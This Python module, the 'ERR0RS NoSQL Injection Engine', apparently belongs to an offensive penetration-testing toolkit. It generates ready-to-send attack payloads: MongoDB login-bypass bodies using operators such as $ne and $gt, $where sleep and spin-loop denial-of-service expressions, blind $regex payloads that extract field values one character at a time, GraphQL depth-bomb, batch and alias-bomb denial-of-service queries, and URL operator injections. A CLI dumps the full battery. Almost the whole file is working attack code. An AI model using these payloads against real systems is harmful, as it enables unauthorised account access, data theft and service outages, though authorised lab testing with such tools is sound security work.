"""
ERR0RS NoSQL Injection Engine
==============================
Production-grade NoSQL injection module. Targets MongoDB-backed APIs
(by far the most common NoSQL in real-world web apps) plus GraphQL.

Capabilities:
  • detect()                — fingerprint NoSQL backends from error/timing
  • auth_bypass_payloads()  — {"$ne": null}/{"$gt": ""} family for login forms
  • blind_regex_payloads()  — character-by-character exfil via $regex
  • where_dos_payloads()    — $where:"sleep(N)" / expensive regex DoS
  • graphql_dos_payloads()  — depth-bomb introspection queries
  • auto_payloads()         — full payload battery for any endpoint

Architecture mirrors jwt_breaker:
  Pure functions. No network I/O. Builds payloads. Caller delivers them.
  This separation keeps the engine deterministic and testable.

Author: Gary Holden Schneider (Eros) | Sprint 02
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import Any, Optional


# ── Data structures ───────────────────────────────────────────────────────

@dataclass
class NoSQLPayload:
    """A single injection payload — for delivery via the orchestrator."""
    technique:    str           # auth_bypass | blind_regex | where_dos | graphql_dos | …
    severity:     str           # critical | high | medium | low | info
    description:  str           # what this payload tests
    location:     str           # body | query_param | header | cookie
    body:         Any = None    # JSON body to POST (dict or str)
    query_string: Optional[str] = None
    method:       str = "POST"
    extras:       dict = field(default_factory=dict)


@dataclass
class DetectionFingerprint:
    """A pattern that indicates a NoSQL backend was triggered."""
    backend:    str             # mongodb | couchdb | graphql | unknown
    confidence: str             # high | medium | low
    indicator:  str             # what we matched on
    detail:     str = ""


# ── Backend fingerprinting ────────────────────────────────────────────────

# Canonical Mongo error signatures pulled from MongoDB driver source +
# real-world bug bounty writeups. These appear when a NoSQL operator
# trips the BSON parser or query planner.
_MONGO_ERROR_PATTERNS = [
    re.compile(r"MongoError",        re.I),
    re.compile(r"BSONError",         re.I),
    re.compile(r"BSONObjectTooLarge",re.I),
    re.compile(r"unknown\s+top\s+level\s+operator",   re.I),
    re.compile(r"unknown\s+operator", re.I),
    re.compile(r"\$where\s+got",     re.I),
    re.compile(r"E11000",            re.I),     # duplicate key
    re.compile(r"MongooseError",     re.I),
    re.compile(r"CastError.*ObjectId", re.I),
    re.compile(r"ValidationError.*Mongoose", re.I),
    re.compile(r"can't\s+\$\w+",     re.I),     # "can't $set", "can't $eq"
    re.compile(r"FieldPath\s+field\s+names", re.I),
    re.compile(r"E\s+QUERY", re.I),
    re.compile(r"failed\s+to\s+parse\s+BSON", re.I),
]

_GRAPHQL_ERROR_PATTERNS = [
    re.compile(r'"errors":\s*\[\s*\{', re.I),
    re.compile(r"GraphQLError",        re.I),
    re.compile(r"graphql-shield",      re.I),
    re.compile(r"Did\s+you\s+mean\s+", re.I),   # GraphQL fuzzy field hint
    re.compile(r"Cannot\s+query\s+field", re.I),
    re.compile(r"Syntax\s+Error.*Unexpected", re.I),
]

_COUCHDB_ERROR_PATTERNS = [
    re.compile(r'"error":\s*"(?:not_found|bad_request|forbidden)"', re.I),
    re.compile(r'"reason":\s*"(?:no_db_file|missing|unknown)"', re.I),
    re.compile(r"CouchDB", re.I),
]


def detect(response_text: str, *,
            response_status: Optional[int] = None,
            response_time_ms: Optional[int] = None,
            baseline_time_ms: Optional[int] = None,
            ) -> list[DetectionFingerprint]:
    """
    Look at a response body / status / timing and decide if a NoSQL backend
    was triggered. Returns list of DetectionFingerprint (possibly empty).

    Pure function. No I/O.
    """
    out: list[DetectionFingerprint] = []
    text = response_text or ""

    # ── MongoDB ────────────────────────────────────────────────────────
    for pat in _MONGO_ERROR_PATTERNS:
        m = pat.search(text)
        if m:
            out.append(DetectionFingerprint(
                backend="mongodb",
                confidence="high",
                indicator=m.group(0),
                detail=f"Mongo error signature matched: {pat.pattern!r}",
            ))
            break  # one high-confidence match is enough for the backend

    # ── GraphQL ────────────────────────────────────────────────────────
    for pat in _GRAPHQL_ERROR_PATTERNS:
        m = pat.search(text)
        if m:
            out.append(DetectionFingerprint(
                backend="graphql",
                confidence="high",
                indicator=m.group(0),
                detail=f"GraphQL error signature matched: {pat.pattern!r}",
            ))
            break

    # ── CouchDB ────────────────────────────────────────────────────────
    for pat in _COUCHDB_ERROR_PATTERNS:
        m = pat.search(text)
        if m:
            out.append(DetectionFingerprint(
                backend="couchdb",
                confidence="medium",
                indicator=m.group(0),
                detail=f"CouchDB error signature matched: {pat.pattern!r}",
            ))
            break

    # ── Timing-based detection ────────────────────────────────────────
    # If a $where:sleep(N) payload was sent and the response took ~N+baseline,
    # that's a confirmed Mongo $where injection.
    if response_time_ms is not None and baseline_time_ms is not None:
        delta = response_time_ms - baseline_time_ms
        # We use a 3s+ delta as the threshold — anything less is too noisy
        # to call from network alone
        if delta >= 3000:
            out.append(DetectionFingerprint(
                backend="mongodb",
                confidence="medium",
                indicator=f"timing_delta={delta}ms",
                detail=(f"Response took {delta}ms longer than baseline — "
                        "consistent with $where:sleep() execution"),
            ))

    return out


# ── Auth bypass payloads ──────────────────────────────────────────────────

# Classic Juice Shop / Mongoose login bypass:
#   {"email":{"$ne":null},"password":{"$ne":null}}
# Server checks for ANY user where email != null AND password != null,
# returns the first match (usually admin), and signs them in.

_AUTH_BYPASS_OPERATORS = [
    {"$ne":     None},
    {"$ne":     ""},
    {"$gt":     ""},
    {"$gt":     " "},
    {"$lt":     "~"},     # ~ is high in ASCII
    {"$regex":  ".*"},
    {"$exists": True},
    {"$in":     ["", " "]},
]


def auth_bypass_payloads(*,
                          username_field: str = "email",
                          password_field: str = "password",
                          login_path:     str = "/rest/user/login",
                          ) -> list[NoSQLPayload]:
    """
    Generate the canonical NoSQL auth-bypass payloads against a JSON login
    endpoint. Operator delivers them — we just build them.
    """
    payloads: list[NoSQLPayload] = []
    for u_op in _AUTH_BYPASS_OPERATORS:
        for p_op in _AUTH_BYPASS_OPERATORS:
            body = {username_field: u_op, password_field: p_op}
            payloads.append(NoSQLPayload(
                technique="auth_bypass",
                severity="critical",
                description=(f"NoSQL auth bypass: {username_field}={u_op}, "
                             f"{password_field}={p_op}"),
                location="body",
                body=body,
                method="POST",
                extras={"path": login_path},
            ))

    # Also the simple "always-true" body with shorter operators
    short = [
        {username_field: {"$ne": None},  password_field: {"$ne": None}},
        {username_field: {"$gt":  ""},    password_field: {"$gt": ""}},
        {username_field: "admin",          password_field: {"$ne": None}},
        {username_field: "admin@admin.com", password_field: {"$ne": None}},
    ]
    for s in short:
        payloads.append(NoSQLPayload(
            technique="auth_bypass",
            severity="critical",
            description=f"NoSQL auth bypass (high-priority): {s}",
            location="body",
            body=s,
            method="POST",
            extras={"path": login_path, "high_priority": True},
        ))
    return payloads


# ── $where DoS / sleep payloads ───────────────────────────────────────────

def where_dos_payloads(*, sleep_ms: int = 5000,
                       target_field: str = "q",
                       endpoint_path: str = "/rest/products/search",
                       ) -> list[NoSQLPayload]:
    """
    Build $where-based time-delay payloads. If the server returns a response
    (sleep_ms + baseline) longer than baseline, the engine confirms a Mongo
    $where injection — and the payload IS the DoS vector simultaneously.
    """
    payloads = []
    expressions = [
        f'sleep({sleep_ms})',                                    # canonical
        f'function() {{ var d = new Date(); '
        f'while(new Date() - d < {sleep_ms}); return true; }}',   # spin loop
        f'function() {{ for(var i=0; i<1000000; i++); return true; }}',
    ]
    for expr in expressions:
        body = {target_field: {"$where": expr}}
        payloads.append(NoSQLPayload(
            technique="where_dos",
            severity="high",
            description=f"$where time-delay probe ({sleep_ms}ms expected)",
            location="body",
            body=body,
            method="POST",
            extras={
                "path":            endpoint_path,
                "expected_delay_ms": sleep_ms,
                "expression":      expr,
            },
        ))
    return payloads


# ── Blind regex exfiltration payloads ─────────────────────────────────────

# Strategy: build payloads that test "does field X start with prefix P?"
# using $regex. Boolean response → leak character at a time.
# Caller iterates: try each character a-z, 0-9, and operators, observe
# which one gives a "match" boolean response, append, repeat.

def blind_regex_charset_payloads(*,
                                   target_field:     str,
                                   known_prefix:     str = "",
                                   alphabet:         str = "abcdefghijklmnopqrstuvwxyz0123456789@._-",
                                   wrap_field:       Optional[str] = None,
                                   ) -> list[NoSQLPayload]:
    """
    For a given known prefix, build N=len(alphabet) payloads, one per
    candidate next character. The orchestrator delivers them, observes
    which one matched (e.g. login succeeded, response 200 vs 401), and
    appends to known_prefix.

    If `wrap_field` is given, the {"$regex": ...} is wrapped in that field;
    otherwise the whole body is the regex test.
    """
    out = []
    for ch in alphabet:
        # Escape regex metacharacters in the prefix
        prefix_re = re.escape(known_prefix)
        ch_re     = re.escape(ch)
        regex     = f"^{prefix_re}{ch_re}"
        body: Any
        if wrap_field:
            body = {wrap_field: {target_field: {"$regex": regex}}}
        else:
            body = {target_field: {"$regex": regex}}
        out.append(NoSQLPayload(
            technique="blind_regex",
            severity="high",
            description=(f"Blind boolean exfil: does {target_field} start with "
                          f"{known_prefix + ch!r}?"),
            location="body",
            body=body,
            method="POST",
            extras={
                "candidate_char": ch,
                "known_prefix":   known_prefix,
                "regex":          regex,
            },
        ))
    return out


# ── GraphQL DoS / introspection ───────────────────────────────────────────

def graphql_introspection_payload(*, endpoint: str = "/graphql"
                                   ) -> NoSQLPayload:
    """Standard introspection query — get the entire schema if exposed."""
    introspection = """
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name } }
      }
    }
  }
}
""".strip()
    return NoSQLPayload(
        technique="graphql_introspection",
        severity="medium",
        description="GraphQL introspection — leaks full schema if enabled",
        location="body",
        body={"query": introspection},
        method="POST",
        extras={"path": endpoint},
    )


def graphql_dos_payloads(*, endpoint: str = "/graphql",
                          depth: int = 12) -> list[NoSQLPayload]:
    """
    Self-referential nested query — exponential complexity. A depth-12
    self-reference against a Person→friends→friends type graph produces
    ~12^12 nodes in the resolver tree. Most servers OOM or hang.

    Default depth=12 is enough to lock most unprotected GraphQL endpoints
    for several seconds without permanently crashing them in a lab.
    """
    # Build something like:
    #   query { user { friends { friends { friends { ... } } } } }
    inner = "id"
    for _ in range(depth):
        inner = f"friends {{ {inner} }}"
    query = f"query {{ user {{ {inner} }} }}"

    payloads = [
        NoSQLPayload(
            technique="graphql_dos",
            severity="high",
            description=f"GraphQL nested-query DoS (depth={depth})",
            location="body",
            body={"query": query},
            method="POST",
            extras={"path": endpoint, "depth": depth},
        ),
    ]

    # Also a batched-query DoS — many simple queries in one request
    batch = [{"query": "{ __typename }"} for _ in range(1000)]
    payloads.append(NoSQLPayload(
        technique="graphql_dos",
        severity="high",
        description="GraphQL batched-query DoS (1000 queries in one request)",
        location="body",
        body=batch,
        method="POST",
        extras={"path": endpoint, "batch_size": 1000},
    ))

    # Alias-bomb: same field aliased 1000 times to multiply work
    aliases = ", ".join(f"a{i}: __typename" for i in range(1000))
    payloads.append(NoSQLPayload(
        technique="graphql_dos",
        severity="medium",
        description="GraphQL alias-bomb (1000 aliases of same field)",
        location="body",
        body={"query": f"{{ {aliases} }}"},
        method="POST",
        extras={"path": endpoint, "aliases": 1000},
    ))

    return payloads


# ── Operator-injection in URL parameters ──────────────────────────────────

# Sometimes you can inject operators directly in URL query strings using
# bracket syntax: ?username[$ne]=null&password[$ne]=null
def querystring_operator_payloads(*, base_path: str = "/rest/user/login",
                                    fields: list[str] = ["email", "password"],
                                    ) -> list[NoSQLPayload]:
    """Build URL-encoded operator-injection payloads for GET endpoints."""
    out = []
    operators = ["$ne", "$gt", "$exists", "$regex", "$in"]
    values    = ["null", "", ".*", "true"]

    for op in operators:
        for val in values:
            qs_parts = [f"{f}[{op}]={val}" for f in fields]
            qs = "&".join(qs_parts)
            out.append(NoSQLPayload(
                technique="querystring_operator",
                severity="high",
                description=f"URL-encoded operator injection: {op}={val} on {fields}",
                location="query_param",
                query_string=qs,
                method="GET",
                extras={"path": base_path, "operator": op, "value": val},
            ))
    return out


# ── Auto: build the full payload battery ──────────────────────────────────

class NoSQLInjector:
    """
    Convenience facade — bundles every payload generator with sensible
    defaults so the orchestrator can call one method and get the full battery.
    """

    def __init__(self):
        pass

    def auto_payloads(self, *,
                       login_path:     str = "/rest/user/login",
                       search_path:    str = "/rest/products/search",
                       graphql_path:   str = "/graphql",
                       username_field: str = "email",
                       password_field: str = "password",
                       ) -> list[NoSQLPayload]:
        """
        Return the full payload battery. The orchestrator delivers each
        and tracks which ones produced a successful exploit.
        """
        out: list[NoSQLPayload] = []
        out.extend(auth_bypass_payloads(
            username_field=username_field,
            password_field=password_field,
            login_path=login_path,
        ))
        out.extend(querystring_operator_payloads(
            base_path=login_path,
            fields=[username_field, password_field],
        ))
        out.extend(where_dos_payloads(
            target_field="q",
            endpoint_path=search_path,
        ))
        out.append(graphql_introspection_payload(endpoint=graphql_path))
        out.extend(graphql_dos_payloads(endpoint=graphql_path))
        return out

    def detect(self, response_text: str, **kw) -> list[DetectionFingerprint]:
        """Wrapper for module-level detect()."""
        return detect(response_text, **kw)

    def blind_regex_charset(self, **kw) -> list[NoSQLPayload]:
        return blind_regex_charset_payloads(**kw)


# Module-level singleton for convenience
_injector: Optional[NoSQLInjector] = None

def get_injector() -> NoSQLInjector:
    global _injector
    if _injector is None:
        _injector = NoSQLInjector()
    return _injector


# ── CLI ───────────────────────────────────────────────────────────────────

def _cli():
    import argparse
    p = argparse.ArgumentParser(
        prog="python3 -m src.tools.web.nosql_injector",
        description="ERR0RS NoSQL injection engine",
    )
    sub = p.add_subparsers(dest="cmd", required=True)

    pdet = sub.add_parser("detect", help="Detect NoSQL backend from response text")
    pdet.add_argument("--response", help="Response body text", default="")
    pdet.add_argument("--time", type=int, help="Response time in ms")
    pdet.add_argument("--baseline", type=int, help="Baseline response time in ms")

    pauth = sub.add_parser("auth-bypass", help="Generate auth-bypass payloads")
    pauth.add_argument("--login-path", default="/rest/user/login")
    pauth.add_argument("--username-field", default="email")
    pauth.add_argument("--password-field", default="password")

    pwhere = sub.add_parser("where-dos", help="Generate $where DoS payloads")
    pwhere.add_argument("--sleep-ms", type=int, default=5000)
    pwhere.add_argument("--path", default="/rest/products/search")

    pblind = sub.add_parser("blind", help="Generate one round of blind regex payloads")
    pblind.add_argument("--field", required=True)
    pblind.add_argument("--prefix", default="")

    pauto = sub.add_parser("auto", help="Generate the full payload battery")

    pgql = sub.add_parser("graphql", help="Generate GraphQL DoS payloads")
    pgql.add_argument("--depth", type=int, default=12)
    pgql.add_argument("--path", default="/graphql")

    args = p.parse_args()

    inj = get_injector()

    def dump(payloads):
        out = [{
            "technique":    p.technique,
            "severity":     p.severity,
            "description":  p.description,
            "method":       p.method,
            "location":     p.location,
            "body":         p.body,
            "query_string": p.query_string,
            "extras":       p.extras,
        } for p in payloads]
        print(json.dumps(out, indent=2))

    if args.cmd == "detect":
        fps = detect(args.response,
                     response_time_ms=args.time,
                     baseline_time_ms=args.baseline)
        print(json.dumps([{"backend": f.backend, "confidence": f.confidence,
                           "indicator": f.indicator, "detail": f.detail}
                          for f in fps], indent=2))
    elif args.cmd == "auth-bypass":
        dump(auth_bypass_payloads(
            username_field=args.username_field,
            password_field=args.password_field,
            login_path=args.login_path,
        ))
    elif args.cmd == "where-dos":
        dump(where_dos_payloads(sleep_ms=args.sleep_ms, endpoint_path=args.path))
    elif args.cmd == "blind":
        dump(blind_regex_charset_payloads(
            target_field=args.field, known_prefix=args.prefix,
        ))
    elif args.cmd == "auto":
        dump(inj.auto_payloads())
    elif args.cmd == "graphql":
        out = [graphql_introspection_payload(endpoint=args.path)]
        out.extend(graphql_dos_payloads(endpoint=args.path, depth=args.depth))
        dump(out)


if __name__ == "__main__":
    _cli()
